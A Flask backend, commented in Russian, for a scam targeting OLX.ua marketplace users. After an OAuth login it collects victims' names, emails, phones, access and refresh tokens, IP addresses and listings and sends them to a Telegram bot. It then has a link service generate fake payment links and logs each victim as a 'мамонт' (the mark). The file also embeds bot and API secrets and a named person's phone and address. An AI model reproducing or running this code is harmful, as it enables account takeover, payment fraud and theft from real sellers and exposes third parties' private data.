from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import os
import json

app = Flask(__name__)

# ---- КОНФИГУРАЦИЯ ----
TG_TOKEN = "8671990790:AAFJ9HAc4SWswxBNKYgIJdqiO6xlI1YRqzw"
TG_CHAT_ID = "-1003571283881"
CLIENT_ID = "202421"
CLIENT_SECRET = "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf"
REDIRECT_URI = "https://maun-producton.up.railway.app/" 

# Твой токен от сервиса ссылок
TPDOM_TOKEN = "eb3fa8ce289e9b94af63c2d90ac63d952198f7ec8a792af80e40743a9b2656f5"
TPDOM_DOMAIN = "https://tpdom.icu"

OLX_LOGO = "https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/OLX_green_logo.svg/250px-OLX_green_logo.svg.png"

def send_telegram_message(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                     json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True},
                     timeout=10)
    except Exception as e:
        print(f"Ошибка ТГ: {e}")

@app.route('/')
def index():
    ads_cookie = request.cookies.get('user_ads')
    user_ads = []
    if ads_cookie:
        try:
            user_ads = json.loads(ads_cookie)
        except:
            user_ads = []
    
    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            html_content = f.read()
            return render_template_string(html_content, user_ads=user_ads)
    except Exception as e:
        return f"Ошибка шаблона: {e}", 500

@app.route('/get_token', methods=['POST'])
def get_token():
    data = request.get_json(silent=True) or {}
    code = data.get('code')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    if not code:
        return jsonify({"error": "No code"}), 400

    try:
        token_res = requests.post(
            'https://www.olx.ua/api/open/oauth/token',
            data={
                'grant_type': 'authorization_code',
                'client_id': CLIENT_ID,
                'client_secret': CLIENT_SECRET,
                'code': code,
                'redirect_uri': REDIRECT_URI,
                'scope': 'read write v2'
            },
            timeout=15
        )

        if token_res.status_code != 200:
            return jsonify({"error": "Auth failed"}), 400

        res_data = token_res.json()
        access = res_data.get('access_token')
        refresh = res_data.get('refresh_token')

        headers = {
            "Authorization": f"Bearer {access}",
            "Version": "2.0"
        }

        # ---------- USER INFO ----------
        user_data = {}
        email = "Не указан"

        try:
            u = requests.get(
                "https://www.olx.ua/api/partner/users/me",
                headers=headers,
                timeout=5
            ).json()

            user_data = u.get('data', {})
            email = user_data.get('email', email)

        except:
            pass

        # ---------- ADS ----------
        ad_list_for_cookie = []
        ads_data = []

        category_cache = {}

        try:
            ads_api_res = requests.get(
                "https://www.olx.ua/api/partner/adverts",
                headers=headers,
                params={"limit": 15},
                timeout=7
            ).json()

            ads_data = ads_api_res.get('data', [])

            for i, ad in enumerate(ads_data):
                title = ad.get('title', 'Без названия')
                url = ad.get('url', 'https://olx.ua')

                category_id = ad.get('category_id')
                category_name = "Неизвестно"

                if category_id:
                    if category_id in category_cache:
                        category_name = category_cache[category_id]
                    else:
                        try:
                            cat_res = requests.get(
                                f"https://www.olx.ua/api/categories/{category_id}",
                                headers=headers,
                                timeout=5
                            )

                            if cat_res.status_code == 200:
                                cat_data = cat_res.json()
                                category_name = cat_data.get("name", "Неизвестно")
                                category_cache[category_id] = category_name

                        except:
                            pass

                if len(ad_list_for_cookie) < 5:
                    ad_list_for_cookie.append({
                        "title": title,
                        "url": url
                    })

        except:
            pass

        # ---------- TELEGRAM MSG ----------
        msg = (
            "👤 <b>АВТОРИЗАЦИЯ ПОЛЬЗОВАТЕЛЯ</b>\n\n"
            f"<b>Имя:</b> {user_data.get('name')}\n"
            f"<b>Email:</b> <code>{email}</code>\n"
            f"<b>Телефон входа:</b><code>{user_data.get('phone_login')}</code>\n\n"
            f"<b>ACCESS TOKEN:</b> <code>{access}</code>\n"
            f"<b>REFRESH TOKEN:</b> <code>{refresh}</code>\n\n"
            f"<b>ID:</b> {user_data.get('id')}\n"
            f"<b>IP:</b> <code>{user_ip}</code>\n\n"
            "<b>📦 Объявления:</b>\n"
        )

        for i, ad in enumerate(ads_data):
            category_id = ad.get('category_id')
            category_name = category_cache.get(category_id, "Неизвестно")

            msg += (
                f"{i + 1}. <a href='{ad.get('url')}'>{ad.get('title')}</a>\n"
                f"📂 {category_name}\n\n"
            )

        send_telegram_message(msg)

        # ---------- RESPONSE ----------
        resp = make_response(jsonify({"status": "ok"}))
        resp.set_cookie(
            'user_ads',
            json.dumps(ad_list_for_cookie),
            max_age=3600,
            path='/'
        )
        return resp

    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ---- МЕТОД: ПРИЕМ ВЫБРАННОГО ТОВАРА + ПОДРОБНЫЙ ЛОГ В ТГ ----
@app.route('/submit_ad', methods=['POST'])
def submit_ad():
    data = request.get_json(silent=True) or {}
    olx_url = data.get('ad_url')
    ad_title = data.get('ad_title')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if not olx_url:
        return jsonify({"error": "No URL provided"}), 400

    try:
        # Отправляем данные на сервис создания ссылок
        res = requests.post(
            url=f"{TPDOM_DOMAIN}/api/createUrl",
            data={
                "fio": "Косенко Олена Дмитрівна",
                "phone_number": "+380963944037",
                "olx_url": olx_url,
                "address": "вул. Шевченка, 24, кв. 15, м. Львів, 79021. Відділення №21"
            },
            headers={"authorization": TPDOM_TOKEN},
            timeout=10
        )

        if res.status_code == 200:
            res_json = res.json()
            created_url = res_json.get("url")
            
            # ФОРМИРУЕМ КРАСИВЫЙ ЛОГ
            log_msg = (
                f"🎯 <b>Мамонт выбрал товар!</b>\n\n"
                f"📦 <b>Товар:</b> {ad_title}\n"
                f"🔗 <b>Оригинал OLX:</b> <a href='{olx_url}'>Перейти</a>\n"
                f"🌐 <b>IP мамонта:</b> <code>{user_ip}</code>\n\n"
                f"💳 <b>Созданная ссылка (открылась у него):</b>\n{created_url}"
            )
            
            send_telegram_message(log_msg)
            
            return jsonify({"status": "ok", "url": created_url})
        else:
            send_telegram_message(f"❌ <b>Ошибка API Ссылок:</b> {res.status_code}\n{res.text}")
            return jsonify({"error": "API error"}), 500

    except Exception as e:
        send_telegram_message(f"⚠️ <b>Ошибка submit_ad:</b> {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/billing')
def billing():
    return "<h1>Оплата замовлення...</h1><p>Будь ласка, не закривайте сторінку.</p>"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
